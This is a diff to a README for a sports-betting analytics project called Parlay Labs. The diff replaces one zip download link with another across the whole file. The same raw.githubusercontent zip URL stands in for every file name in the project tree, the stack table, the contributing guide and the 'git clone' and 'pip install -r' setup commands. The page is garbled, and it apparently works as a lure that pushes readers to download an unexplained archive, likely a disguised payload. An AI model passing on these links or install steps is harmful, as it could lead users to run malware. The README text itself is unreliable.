@@ -19,7 +19,7 @@ Parlay Labs unites expert-level disciplines — **data science, quantitative fin
 | Layer | Stack |
 |-------|--------|
 | **Frontend** | React + TypeScript + Vite + Tailwind CSS |
-| **Backend API** | FastAPI (Python) / Express (https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip) |
+| **Backend API** | FastAPI (Python) / Express (https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip) |
 | **Machine Learning** | Python (pandas, NumPy, scikit-learn, PyMC3, XGBoost) |
 | **Database** | PostgreSQL (primary) + Redis (cache) |
 | **Deployment** | Vercel (frontend) + AWS Lambda / Docker (backend) |
@@ -36,35 +36,35 @@ Parlay Labs unites expert-level disciplines — **data science, quantitative fin
 ```
 parlay-labs/
 ├── backend/
-│   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip                # FastAPI backend entry point
+│   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip                # FastAPI backend entry point
 │   ├── models/                # Simulation + analytics engines
-│   │   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
-│   │   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
-│   │   └── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
+│   │   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
+│   │   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
+│   │   └── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
 │   └── data/
-│       ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
-│       └── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
+│       ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
+│       └── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
 ├── frontend/
 │   ├── src/
 │   │   ├── components/
-│   │   │   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
-│   │   │   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
-│   │   └── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
+│   │   │   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
+│   │   └── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
 ├── database/
-│   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
-│   └── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
-└── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
+│   ├── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
+│   └── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
+└── https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
 ```
 
 ## 🚀 Getting Started
 ```bash
 # Clone the repo
-git clone https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
+git clone https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
 cd parlay-labs
 
 # Backend setup
 cd backend
-pip install -r https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip
+pip install -r https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip
 uvicorn main:app --reload
 
 # Frontend setup
@@ -76,7 +76,7 @@ npm run dev
 Visit `http://localhost:5173` to open the Parlay Labs Dashboard.
 
 ## 🤝 Contributing
-Pull requests and feature suggestions are welcome! See `https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/Parlay_labs_3.0-beta.4.zip` for setup guidelines and branch workflow.
+Pull requests and feature suggestions are welcome! See `https://raw.githubusercontent.com/monee44/Parlay-labs/main/document/labs_Parlay_v1.7-beta.2.zip` for setup guidelines and branch workflow.
 
 ## 🧑‍🏍‍♀️ Vision
 Parlay Labs aims to become the **gold standard for transparent, data-driven sports prediction**, empowering users with responsible, mathematically sound betting tools that continuously self-calibrate and improve.
